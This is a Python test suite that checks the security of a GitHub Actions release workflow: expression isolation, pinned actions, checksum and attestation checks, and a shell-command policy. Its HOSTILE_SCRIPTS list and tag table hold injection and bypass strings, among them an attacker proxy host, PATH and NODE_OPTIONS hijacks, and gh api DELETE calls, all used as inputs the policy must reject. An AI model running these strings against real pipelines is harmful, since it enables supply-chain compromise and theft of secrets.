"""GitHub Actions release runner boundaries, included in ci.json's platform regression suite."""

import hashlib
import io
import itertools
import os
from pathlib import Path
import re
import stat
import subprocess
import tarfile
import tempfile
import unittest
import zipfile

import yaml

if __package__:
    from .release_shell_policy import check_privileged_script
else:
    from release_shell_policy import check_privileged_script

DEFAULT_WORKFLOW = Path(__file__).resolve().parents[2] / ".github/workflows/release.yml"
WORKFLOW = Path(os.environ.get("RELEASE_WORKFLOW_PATH", DEFAULT_WORKFLOW))
DOCUMENT = yaml.safe_load(WORKFLOW.read_text())
JOBS = DOCUMENT["jobs"]
BUNDLE = "ai-architect-mcp-spec.mcpb"
SBOM = "ai-architect-mcp-spec.cdx.json"


# One table for the whole SemVer tag class: (tag, accepted, published as prerelease).
# A prerelease is a hyphen in the version before "+"; build metadata may hold
# hyphens too and never makes a release a prerelease (SemVer 2.0.0, items 9-10).
# source: https://semver.org/spec/v2.0.0.html
TAGS = [
    ("v1.2.3", True, False), ("v1.2.3-rc.1", True, True),
    ("v0.0.0-rc.1+build.8", True, True), ("v1.2.3+sha-1", True, False),
    ("v1.2.3+sha-1.build-2.x", True, False), ("v1.2.3+-", True, False),
    ("v1.2.3-rc.1+sha-1", True, True), ("v1.2.3-x-y+sha-1", True, True),
    ("v1.2.3-0+0", True, True),
    ("", False, None), ("main", False, None), ("v01.2.3", False, None),
    ("v1.2.3-01", False, None), ("v1.2.3-", False, None), ("v1.2.3+", False, None),
    ("v1.2.3-rc.1+", False, None), ("v1.2.3+sha..1", False, None),
    ("v1.2.3+sha_1", False, None), ("v1.2.3+a+b", False, None),
    ("v1.2.3$( )", False, None), ('v1.2.3"', False, None), ("v1.2.3;", False, None),
    ("v1.02.3", False, None), ("v1.2.03", False, None), ("v1.2.3-rc.01", False, None),
    ("--flag=v1.2.3", False, None), ("prefix\nv1.2.3", False, None),
    ("v1.2.3\nother=value", False, None),
]


# Each is a construct the previous policy accepted or a sibling of one: the review
# of #399 (B1 to B3) ran the first nine under bash and saw the payload execute.
HOSTILE_SCRIPTS = (
    "node --version", "sh release-notes.md", "bash release-notes.md", "python3 local.py",
    "curl --config release-notes.md", "./tool", "echo ok && other-tool",
    "if [ -f input ]; then other-tool; fi", "value=$(other-tool)", 'echo "$(other-tool)"',
    # B1: text rewriting before splitting.
    "echo ok\\\\\nbash ./release-notes.md\n",
    'echo "ok\n# "; bash ./release-notes.md; echo "\ndone"',
    "echo 'ok\n# '; bash ./release-notes.md; echo '\ndone'",
    # B2: loop variables, aliases of a fixed destination.
    'for GITHUB_OUTPUT in "$GITHUB_ENV"; do echo "NODE_OPTIONS=x" >> "$GITHUB_OUTPUT"; done',
    'for PATH in /tmp/evil; do echo "PATH=$PATH"; done',
    'archive="$GITHUB_ENV"\ngh api repos/o/r > "$archive"',
    'file="mcp-publisher"\nunzip -p "$archive" "$file" > "./$file"',
    # B3: the execution environment of the next command.
    "NODE_OPTIONS=--require=./release-notes.md gh api repos/o/r",
    "HTTPS_PROXY=http://attacker.invalid:8080 curl -fsSL https://registry.modelcontextprotocol.io/v0/servers?search=ai-architect-mcp-spec",
    "export NODE_OPTIONS=x", "printf -v PATH x", "x=${PATH:=/tmp}", "echo ${!x}", "echo $'\\x41'",
    # Commands bash would run from data, and writes through a read-only tool.
    "{bash,./release-notes.md}", "./mcp-publishe? login github-oidc", "$CMD login",
    "gh api -X DELETE repos/o/r/releases/1", "gh api -f a=b repos/o/r", "gh api --input f repos/o/r",
    "jq -r -rf ./release-notes.md server.json", "jq --rawfile a f . server.json", "grep -qi -f pat x",
    "echo hi &", "cat <<EOF\nx\nEOF", "diff <(cat a) b", "echo `id`", "echo x >| f", "echo x &> f",
    "eval echo", ". ./release-notes.md", "( bash x )", "echo $((1+$(id)))", "echo x 3> \"$GITHUB_ENV\"",
    # A "#" inside a word is not a comment; a here-document's body is data.
    "echo ok#; bash ./release-notes.md", "cat <<echo\necho\necho\n",
    'for file in "$GITHUB_ENV"; do unzip -p "$archive" "$file" > "./$file"; done',
    # Fail closed on what the scripts never need: escapes, a quoted command word.
    "echo a\\ b", 'echo "a\\$b"', '"echo" ok',
)
PRIVILEGED = ("release", "publish_registry")
# The only variables the jobs with write or OIDC grants may receive (workflow,
# job and step env). Anything else, NODE_OPTIONS or HTTPS_PROXY included, could
# change what an action or a tool runs.
PRIVILEGED_ENV = {"GH_TOKEN", "GH_REPO", "REPOSITORY", "TAG", "ARTIFACT_ID", "ARCHIVE_SHA256",
                  "COMMIT", "DIGEST", "EVENT_NAME", "MCP_PUBLISHER_VERSION", "MCP_PUBLISHER_SHA256"}


def named_step(name):
    return next(step for job in JOBS.values() for step in job.get("steps", [])
                if step.get("name") == name)


def workflow_fields(value):
    """Walk jobs, steps and nested action inputs, including reusable workflow calls."""
    if isinstance(value, dict):
        for key, child in value.items():
            yield key, child
            yield from workflow_fields(child)
    elif isinstance(value, list):
        for child in value:
            yield from workflow_fields(child)


def run_step(name, cwd, **env):
    script = named_step(name)["run"]
    if "${{" in script:
        raise AssertionError(f"{name} contains GitHub expressions in shell source")
    return subprocess.run(["bash", "-euo", "pipefail", "-c", script], cwd=cwd,
                          env={"PATH": os.environ["PATH"], **env}, capture_output=True, text=True)


class ReleaseSecurity(unittest.TestCase):
    def test_no_expression_is_compiled_into_shell_source(self):
        for job, spec in JOBS.items():
            for step in spec.get("steps", []):
                with self.subTest(job=job, step=step.get("name")):
                    self.assertNotIn("${{", step.get("run", ""))

    def test_trigger_data_enters_through_environment_only(self):
        for field, value in workflow_fields(DOCUMENT):
            if field == "if":
                # Conditions are expressions even without the ${{ }} wrapper.
                for expr in [value, *re.findall(r"\$\{\{(.*?)\}\}", value, re.S)]:
                    condition = re.sub(r"'(?:[^']|'')*'", "", expr)
                    for name in re.findall(r"[A-Za-z_][\w.-]*", condition):
                        self.assertRegex(name, r"^(?:github\.event_name|needs\.[\w-]+\.result|cancelled)$")
            elif field in {"name", "run-name", "with"}:
                for item in value.values() if isinstance(value, dict) else (value,):
                    for expr in re.findall(r"\$\{\{(.*?)\}\}", str(item), re.S):
                        self.assertEqual(expr.strip(), "github.run_attempt", field)

    def test_build_has_only_read_access_and_checkout_does_not_persist(self):
        for job, spec in JOBS.items():
            for step in spec.get("steps", []):
                action = step.get("uses", "").partition("@")[0]
                if action == "actions/checkout":
                    with self.subTest(job=job, control="checkout"):
                        self.assertIs(step["with"].get("persist-credentials"), False, f"{job}: persisted checkout")
                        self.assertEqual(spec.get("permissions", DOCUMENT["permissions"]), {"contents": "read"})

    def test_actions_are_immutable_and_package_caches_are_disabled(self):
        for key, action in workflow_fields(DOCUMENT):
            if key == "uses":
                # A suffix on ./local@<hash> would still resolve from the checkout.
                self.assertRegex(action, r"^[A-Za-z0-9][A-Za-z0-9-]*/[\w.-]+(?:/[\w.-]+)*@[a-fA-F0-9]{40}\Z")
                self.assertNotRegex(action, r"^actions/cache(?:/|@)")
        for job in JOBS.values():
            for step in job.get("steps", []):
                action = step.get("uses", "").partition("@")[0]
                inputs = step.get("with", {})
                if action == "actions/setup-node":
                    self.assertIs(inputs.get("package-manager-cache"), False)
                    self.assertNotIn("cache", inputs)
                if action == "pnpm/action-setup":
                    self.assertIs(inputs.get("cache", False), False)

    def test_privileged_command_policy_fails_closed_on_unreviewed_executables(self):
        # Policy inputs only. None of these snippets is passed to a shell here; the
        # reproduction of the review's bypasses under bash is recorded with the PR.
        for script in HOSTILE_SCRIPTS:
            with self.subTest(script=script), self.assertRaises(AssertionError):
                check_privileged_script(script)

    def test_every_privileged_script_is_read_by_the_policy(self):
        for job in PRIVILEGED:
            for step in JOBS[job]["steps"]:
                if "run" in step:
                    with self.subTest(job=job, step=step["name"]):
                        self.assertTrue(check_privileged_script(step["run"]))

    def test_permissions_and_release_dependencies(self):
        self.assertEqual(DOCUMENT["permissions"], {})
        self.assertEqual(JOBS["target"].get("permissions", DOCUMENT["permissions"]), {})
        self.assertEqual(JOBS["build"]["permissions"], {"contents": "read"})
        self.assertEqual(JOBS["build"]["needs"], "target")
        self.assertEqual(JOBS["build"].get("if"), "github.event_name == 'push'")
        self.assertEqual(JOBS["release"]["permissions"], {
            "actions": "read", "contents": "write", "attestations": "write", "id-token": "write",
        })
        registry = JOBS["publish_registry"]
        self.assertEqual(registry["permissions"], {
            "contents": "read", "attestations": "read", "id-token": "write",
        })
        self.assertEqual(set(registry["needs"]), {"target", "release"})
        install = named_step("Install mcp-publisher (checksum-verified)")
        self.assertIn(install, registry["steps"])
        self.assertEqual(" ".join(registry.get("if", "").split()),
                         "!cancelled() && needs.target.result == 'success' && "
                         "(github.event_name == 'workflow_dispatch' || needs.release.result == 'success')")
        for name, job in JOBS.items():
            with self.subTest(job=name):
                grants = job.get("permissions", DOCUMENT["permissions"])
                self.assertIsInstance(grants, dict)
                if name not in {"release", "publish_registry"}:
                    for scope, mode in grants.items():
                        self.assertIn(mode, ("read", "none"))
                        if scope in {"id-token", "attestations"}:
                            self.assertEqual(mode, "none")
                if "write" in grants.values():
                    self.assertNotIn("uses", job)
                    self.assertNotIn("container", job)
                    self.assertNotIn("services", job)
                    for options in (DOCUMENT, job):
                        self.assertFalse(options.get("defaults", {}).get("run"))
                    for options in (DOCUMENT, job, *job["steps"]):
                        self.assertLessEqual(set(options.get("env", {})), PRIVILEGED_ENV,
                                             "a privileged job receives a variable outside its list")
                    for step in job["steps"]:
                        self.assertNotIn("if", step, "a privileged verification step could be skipped")
                        self.assertIs(step.get("continue-on-error", False), False)
                        if "uses" in step:
                            self.assertEqual(step["uses"].partition("@")[0], "actions/attest-build-provenance")
                        else:
                            self.assertNotIn("shell", step)
                            self.assertNotIn("working-directory", step)
                            check_privileged_script(step["run"])
                            if "./mcp-publisher" in step["run"]:
                                self.assertEqual(name, "publish_registry")
                                self.assertLess(job["steps"].index(install), job["steps"].index(step))
        attest = named_step("Attest build provenance (.mcpb + SBOM)")
        self.assertEqual(set(attest["with"]["subject-path"].split()), {BUNDLE, SBOM})

    def test_event_selects_and_validates_the_tag_before_export(self):
        self.assertEqual(named_step("Resolve target tag")["env"], {
            "EVENT_NAME": "${{ github.event_name }}", "REF_NAME": "${{ github.ref_name }}",
            "DISPATCH_TAG": "${{ inputs.tag }}",
        })
        for event in ["push", "workflow_dispatch"]:
            for value, valid, _ in TAGS:
                with self.subTest(event=event, value=value), tempfile.TemporaryDirectory() as directory:
                    output = Path(directory, "output")
                    output.touch()
                    result = run_step("Resolve target tag", directory, EVENT_NAME=event,
                                      REF_NAME=value if event == "push" else "main",
                                      DISPATCH_TAG=value if event == "workflow_dispatch" else "",
                                      GITHUB_OUTPUT=str(output))
                    self.assertEqual(result.returncode == 0, valid, result.stderr)
                    self.assertEqual(output.read_text(), f"tag={value}\n" if valid else "")

    def test_verified_archive_is_read_as_data_before_attestation_or_publication(self):
        job = JOBS["release"]
        steps = job["steps"]
        verify = named_step("Verify and read release artifact")
        self.assertEqual(steps.index(verify), 0)
        self.assertIn("build", job["needs"])
        self.assertEqual(verify["env"]["ARCHIVE_SHA256"], "${{ needs.build.outputs.digest }}")
        self.assertEqual(verify["env"]["ARTIFACT_ID"], "${{ needs.build.outputs.id }}")
        check_privileged_script(verify["run"])
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            archive = root / "input.zip"
            with zipfile.ZipFile(archive, "w") as z:
                for file in [BUNDLE, SBOM]:
                    z.writestr(file, file.encode())
                    z.writestr(file + ".sha256", hashlib.sha256(file.encode()).hexdigest() + "\n")
                link = zipfile.ZipInfo("release-notes.md")
                link.create_system = 3  # Unix ZIP entry
                link.external_attr = (stat.S_IFLNK | 0o777) << 16
                z.writestr(link, "local-note.txt")
                z.writestr("unrequested", b"must stay inside the archive")
            gh = root / "gh"
            gh.write_text('#!/bin/sh\necho called >> api-calls\n'
                          'case "$2" in */zip) cat "$FIXTURE";; *) echo 42;; esac\n')
            gh.chmod(0o755)
            env = dict(PATH=str(root) + os.pathsep + os.environ["PATH"], FIXTURE=str(archive),
                       ARTIFACT_ID="23", REPOSITORY="owner/repo", RUNNER_TEMP=directory,
                       GITHUB_RUN_ID="42")
            digest = hashlib.sha256(archive.read_bytes()).hexdigest()
            for field, invalid in [("ARTIFACT_ID", "23/other"), ("ARTIFACT_ID", ""),
                                   ("ARCHIVE_SHA256", "z" * 64), ("ARCHIVE_SHA256", digest[:-1])]:
                with self.subTest(field=field, invalid=invalid):
                    malformed = {**env, "ARCHIVE_SHA256": digest, field: invalid}
                    self.assertNotEqual(run_step(verify["name"], root, **malformed).returncode, 0)
                    self.assertFalse((root / "api-calls").exists(), "invalid input reached GitHub")
            foreign = run_step(verify["name"], root, **{**env, "GITHUB_RUN_ID": "43"}, ARCHIVE_SHA256=digest)
            self.assertNotEqual(foreign.returncode, 0)
            self.assertIn("different workflow run", foreign.stdout)
            bad = run_step(verify["name"], root, **env, ARCHIVE_SHA256="0" * 64)
            self.assertNotEqual(bad.returncode, 0)
            self.assertFalse((root / BUNDLE).exists())
            good = run_step(verify["name"], root, **env, ARCHIVE_SHA256=digest)
            self.assertEqual(good.returncode, 0, good.stderr + good.stdout)
            self.assertEqual((root / BUNDLE).read_bytes(), BUNDLE.encode())
            self.assertEqual((root / SBOM).read_bytes(), SBOM.encode())
            notes = root / "release-notes.md"
            self.assertTrue(stat.S_ISREG(notes.lstat().st_mode), "archive link must be read as plain bytes")
            self.assertEqual(notes.read_bytes(), b"local-note.txt")
            self.assertFalse((root / "unrequested").exists())
            with zipfile.ZipFile(archive, "w") as z:
                for file in [BUNDLE, SBOM, "release-notes.md"]:
                    z.writestr(file, b"modified")
                    if file != "release-notes.md":
                        z.writestr(file + ".sha256", "0" * 64)
            wrong_companion = run_step(verify["name"], root, **env,
                                       ARCHIVE_SHA256=hashlib.sha256(archive.read_bytes()).hexdigest())
            self.assertNotEqual(wrong_companion.returncode, 0)
            self.assertIn("Checksum mismatch", wrong_companion.stdout)

    def test_publisher_archive_is_checked_before_extracting_the_executable(self):
        step = named_step("Install mcp-publisher (checksum-verified)")
        self.assertRegex(step["env"]["MCP_PUBLISHER_SHA256"], r"^[0-9a-f]{64}\Z")
        self.assertRegex(step["env"]["MCP_PUBLISHER_VERSION"], r"^v\d+\.\d+\.\d+\Z")
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            fixture = root / "fixture.tar.gz"
            data = b"test publisher archive member\n"
            with tarfile.open(fixture, "w:gz") as archive:
                member = tarfile.TarInfo("mcp-publisher")
                member.size = len(data)
                archive.addfile(member, io.BytesIO(data))
            curl = root / "curl"
            curl.write_text('#!/bin/sh\ncp "$FIXTURE" mcp-publisher_linux_amd64.tar.gz\n')
            curl.chmod(0o755)
            env = {**step["env"], "FIXTURE": str(fixture), "PATH": str(root) + os.pathsep + os.environ["PATH"]}
            result = run_step(step["name"], root, **env)
            self.assertNotEqual(result.returncode, 0)
            self.assertFalse((root / "mcp-publisher").exists(), "unverified executable was extracted")
            env["MCP_PUBLISHER_SHA256"] = hashlib.sha256(fixture.read_bytes()).hexdigest()
            result = run_step(step["name"], root, **env)
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual((root / "mcp-publisher").read_bytes(), data)

    def test_registry_digest_export_requires_attestation_for_the_release_commit(self):
        step = named_step("Download and verify the public .mcpb asset")
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            data = b"public bundle fixture\n"
            digest = hashlib.sha256(data).hexdigest()
            (root / BUNDLE).write_bytes(data)
            (root / (BUNDLE + ".sha256")).write_text(digest + "\n")
            gh = root / "gh"
            gh.write_text('#!/bin/sh\ncase "$1 $2" in\n'
                          '  "release download") exit 0;;\n'
                          '  "attestation verify") printf "%s\\n" "$@" > verified-args; exit "$VERDICT";;\n'
                          '  *) exit 99;;\nesac\n')
            gh.chmod(0o755)
            output = root / "output"
            output.touch()
            repo, tag, commit = "owner/repo", "v1.2.3", "a" * 40
            env = dict(PATH=str(root) + os.pathsep + os.environ["PATH"], REPOSITORY=repo,
                       TAG=tag, COMMIT=commit, GITHUB_OUTPUT=str(output))
            rejected = run_step(step["name"], root, **env, VERDICT="41")
            self.assertEqual(rejected.returncode, 41)
            self.assertEqual(output.read_bytes(), b"", "digest exported after attestation failure")
            accepted = run_step(step["name"], root, **env, VERDICT="0")
            self.assertEqual(accepted.returncode, 0, accepted.stderr)
            self.assertEqual(output.read_text(), f"digest={digest}\n")
            args = (root / "verified-args").read_text().splitlines()
            self.assertEqual(args[:3], ["attestation", "verify", BUNDLE])
            self.assertEqual(dict(zip(args[3::2], args[4::2], strict=True)), {
                "--repo": repo, "--signer-workflow": repo + "/.github/workflows/release.yml",
                "--source-ref": "refs/tags/" + tag, "--source-digest": commit,
            })

    def test_release_command_creates_and_updates_the_four_assets(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            gh = root / "gh"
            gh.write_text('#!/bin/sh\nprintf "%s\\n" "$*" >> commands\n'
                          'if [ "$2" = view ]; then exit "$VIEW"; fi\n')
            gh.chmod(0o755)
            published = [(tag, str(pre).lower()) for tag, valid, pre in TAGS if valid]
            self.assertEqual({p for _, p in published}, {"true", "false"})
            for exists, (tag, prerelease) in itertools.product((False, True), published):
                with self.subTest(exists=exists, tag=tag):
                    result = run_step("Create or update the GitHub Release", root,
                                      PATH=str(root) + os.pathsep + os.environ["PATH"], TAG=tag,
                                      VIEW="0" if exists else "1")
                    self.assertEqual(result.returncode, 0, result.stderr)
                    log = root / "commands"
                    commands = log.read_text().splitlines()
                    log.unlink()
                    self.assertTrue(commands[1].startswith(f"release {'upload' if exists else 'create'} {tag} "))
                    for asset in [BUNDLE, SBOM, BUNDLE + ".sha256", SBOM + ".sha256"]:
                        self.assertIn(asset, commands[1].split())
                    self.assertIn("--notes-file release-notes.md", commands[-1])
                    self.assertIn(f"--prerelease={prerelease}", commands[-1])

    def test_registry_duplicate_is_recoverable_only_for_manual_dispatch(self):
        with tempfile.TemporaryDirectory() as directory:
            publisher = Path(directory, "mcp-publisher")
            publisher.write_text('#!/bin/sh\necho "duplicate version"; exit 7\n')
            publisher.chmod(0o755)
            for event, code in [("push", 7), ("workflow_dispatch", 0)]:
                with self.subTest(event=event):
                    result = run_step("Publish server.json to the MCP Registry", directory,
                                      EVENT_NAME=event, TAG="v1.2.3")
                    self.assertEqual(result.returncode, code)
            publisher.write_text('#!/bin/sh\necho "service unavailable"; exit 7\n')
            result = run_step("Publish server.json to the MCP Registry", directory,
                              EVENT_NAME="workflow_dispatch", TAG="v1.2.3")
            self.assertEqual(result.returncode, 7)


def expressions(value, path=()):
    """Every ${{ }} expression of the document, with the path of the field holding it."""
    if isinstance(value, dict):
        for key, child in value.items():
            yield from expressions(child, (*path, key))
    elif isinstance(value, list):
        for index, child in enumerate(value):
            yield from expressions(child, (*path, index))
    elif isinstance(value, str):
        for expr in re.findall(r"\$\{\{(.*?)\}\}", value, re.S):
            yield path, expr.strip()


OUTPUT_REFERENCE = re.compile(r"(?:steps|needs)\.[\w-]+\.outputs\.[\w-]+")


def expression_allowed(path, expr):
    """The one place each kind of expression may appear; anywhere else is refused."""
    if path[0] != "jobs" or len(path) < 3:
        return False
    job, field = path[1], path[2]
    if field == "if":
        return True  # its own grammar: test_trigger_data_enters_through_environment_only
    if field == "outputs":
        return len(path) == 4 and re.fullmatch(r"steps\.[\w-]+\.outputs\.[\w-]+", expr) is not None
    if field != "steps" or len(path) != 6:
        return False  # runs-on, concurrency, environment, strategy, name, services...
    step = JOBS[job]["steps"][path[3]]
    if path[4] == "with":
        return expr == "github.run_attempt"
    if path[4] != "env":
        return False
    if job == "target" and step.get("name") == "Resolve target tag":
        return expr in {"github.event_name", "github.ref_name", "inputs.tag"}
    return expr in {"github.token", "github.repository", "github.event_name"} or bool(
        OUTPUT_REFERENCE.fullmatch(expr))


class TriggerDataHasOnePlace(unittest.TestCase):
    def test_every_expression_has_its_one_place(self):
        for path, expr in expressions(DOCUMENT):
            with self.subTest(path=path, expr=expr):
                self.assertTrue(expression_allowed(path, expr), f"{expr} is not allowed at {path}")

    def test_the_validated_tag_is_the_only_tag_downstream(self):
        self.assertEqual(JOBS["target"]["outputs"], {"tag": "${{ steps.resolve.outputs.tag }}"})
        tags = [(job, step.get("name"), step["env"]["TAG"]) for job, spec in JOBS.items()
                for step in spec.get("steps", []) if "TAG" in step.get("env", {})]
        self.assertTrue(tags)
        for job, name, value in tags:
            with self.subTest(job=job, step=name):
                self.assertEqual(value, "${{ needs.target.outputs.tag }}")
        self.assertEqual(JOBS["release"]["needs"], ["target", "build"])


def fake_gh(root, script):
    gh = root / "gh"
    gh.write_text("#!/bin/sh\n" + script)
    gh.chmod(0o755)
    return str(root) + os.pathsep + os.environ["PATH"]


class RegistryChecks(unittest.TestCase):
    """The registry job's verifications, run with GitHub replaced by fixtures."""

    def manifest(self, root, version="1.2.3", package="1.2.3", identifier=None, commit="a" * 40):
        identifier = identifier or ("https://github.com/owner/repo/releases/download/v1.2.3/" + BUNDLE)
        (root / "fixture.json").write_text(
            '{"version": "%s", "packages": [{"version": "%s", "identifier": "%s"}]}' % (version, package, identifier))
        path = fake_gh(root, 'case "$*" in *commits/refs/tags/*) echo "$COMMIT_FIXTURE";;\n'
                             '  *contents/server.json*) cat fixture.json;;\n  *) exit 99;;\nesac\n')
        output = root / "output"
        output.write_text("")
        return run_step("Verify server.json version matches the tag being published", root, PATH=path,
                        REPOSITORY="owner/repo", TAG="v1.2.3", COMMIT_FIXTURE=commit, GITHUB_OUTPUT=str(output))

    def test_manifest_must_match_the_tag_and_the_public_asset(self):
        for name, kwargs in [("version", {"version": "1.2.4"}), ("package", {"package": "1.2.4"}),
                             ("identifier", {"identifier": "https://example.invalid/x.mcpb"}),
                             ("commit", {"commit": "main"})]:
            with self.subTest(case=name), tempfile.TemporaryDirectory() as directory:
                self.assertNotEqual(self.manifest(Path(directory), **kwargs).returncode, 0)
        with tempfile.TemporaryDirectory() as directory:
            result = self.manifest(Path(directory))
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(Path(directory, "output").read_text(), "commit=" + "a" * 40 + "\n")

    def test_public_asset_companion_mismatch_exports_no_digest(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / BUNDLE).write_bytes(b"public bundle\n")
            (root / (BUNDLE + ".sha256")).write_text("0" * 64 + "\n")
            output = root / "output"
            output.write_text("")
            path = fake_gh(root, "exit 0\n")
            result = run_step("Download and verify the public .mcpb asset", root, PATH=path, REPOSITORY="o/r",
                              TAG="v1.2.3", COMMIT="a" * 40, GITHUB_OUTPUT=str(output))
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("checksum mismatch", result.stdout + result.stderr)
            self.assertEqual(output.read_text(), "")


# Accepted scripts where a text-rewriting reader and bash disagree: a "#" line
# inside a string, a line continuation. Each runs a second command (sleep) that
# a reader dropping the wrong text would miss.
TRICKY = ('echo "ok\n# "; sleep 0; echo "\ndone"\n', "echo 'ok\n# '; sleep 0; echo '\ndone'\n",
          "echo ok \\\n  more; sleep 0\n", "echo a # sleep is a comment here\nsleep 0\n",
          "echo ok#; sleep 0\n")
TRACE_ENV = {"ARTIFACT_ID": "23", "ARCHIVE_SHA256": "a" * 64, "GITHUB_RUN_ID": "42", "REPOSITORY": "o/r",
             "GH_REPO": "o/r", "TAG": "v1.2.3", "COMMIT": "a" * 40, "DIGEST": "a" * 64, "EVENT_NAME": "push",
             "MCP_PUBLISHER_VERSION": "v1.8.1", "MCP_PUBLISHER_SHA256": "a" * 64, "GH_TOKEN": "fixture"}


class PolicyAgreesWithBash(unittest.TestCase):
    """Differential check: every command bash runs is one the policy read."""

    def executed(self, script, names):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            stubs = root / "bin"
            stubs.mkdir()
            for name in set(names) | {"gh", "curl", "jq", "unzip", "tar", "chmod", "cmp", "cut", "cat",
                                      "sha256sum", "shasum", "awk", "grep", "seq", "sleep"}:
                if "/" not in name and name not in {"[", "[[", "echo", "printf", "set", "exit", "for"}:
                    (stubs / name).write_text("#!/bin/sh\nexit 0\n")
                    (stubs / name).chmod(0o755)
            (root / "mcp-publisher").write_text("#!/bin/sh\nexit 0\n")
            (root / "mcp-publisher").chmod(0o755)
            output = root / "output"
            output.touch()
            env = {**TRACE_ENV, "PATH": str(stubs), "RUNNER_TEMP": directory, "GITHUB_OUTPUT": str(output),
                   "PS4": "+TRACE "}
            prelude = "command_not_found_handle() { echo \"+TRACE $1\" >&2; return 0; }\n"
            result = subprocess.run(["/bin/bash", "-x", "-c", prelude + script], cwd=root, env=env,
                                    capture_output=True, text=True, timeout=60)
            ran = set()
            for line in result.stderr.splitlines():
                if line.lstrip("+").startswith("TRACE "):
                    first = line.lstrip("+")[len("TRACE "):].split(" ", 1)[0].strip("'")
                    if first and not re.fullmatch(r"[A-Za-z_]\w*(?:\[\d*\])?\+?=.*", first):
                        ran.add(first)
            return ran

    def test_bash_runs_no_command_the_policy_did_not_read(self):
        scripts = [(f"{job}: {step['name']}", step["run"]) for job in PRIVILEGED
                   for step in JOBS[job]["steps"] if "run" in step]
        scripts += [(f"tricky {i}", script) for i, script in enumerate(TRICKY)]
        for label, script in scripts:
            with self.subTest(script=label):
                names = set(check_privileged_script(script))
                ran = self.executed(script, names)
                self.assertTrue(ran, "bash ran nothing: the comparison would be empty")
                self.assertLessEqual(ran - {"command_not_found_handle"}, names | {"]]"},
                                     "bash ran a command the policy never read")


class ReleaseArtifactCompanions(unittest.TestCase):
    def test_a_corrupted_sbom_companion_alone_stops_the_release(self):
        verify = named_step("Verify and read release artifact")
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            archive = root / "input.zip"
            with zipfile.ZipFile(archive, "w") as z:
                for file in [BUNDLE, SBOM]:
                    z.writestr(file, file.encode())
                    digest = hashlib.sha256(file.encode()).hexdigest() if file == BUNDLE else "0" * 64
                    z.writestr(file + ".sha256", digest + "\n")
                z.writestr("release-notes.md", b"notes")
            path = fake_gh(root, 'case "$2" in */zip) cat "$FIXTURE";; *) echo 42;; esac\n')
            result = run_step(verify["name"], root, PATH=path, FIXTURE=str(archive), ARTIFACT_ID="23",
                              REPOSITORY="o/r", RUNNER_TEMP=directory, GITHUB_RUN_ID="42",
                              ARCHIVE_SHA256=hashlib.sha256(archive.read_bytes()).hexdigest())
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("Checksum mismatch for " + SBOM, result.stdout)


if __name__ == "__main__":
    unittest.main()
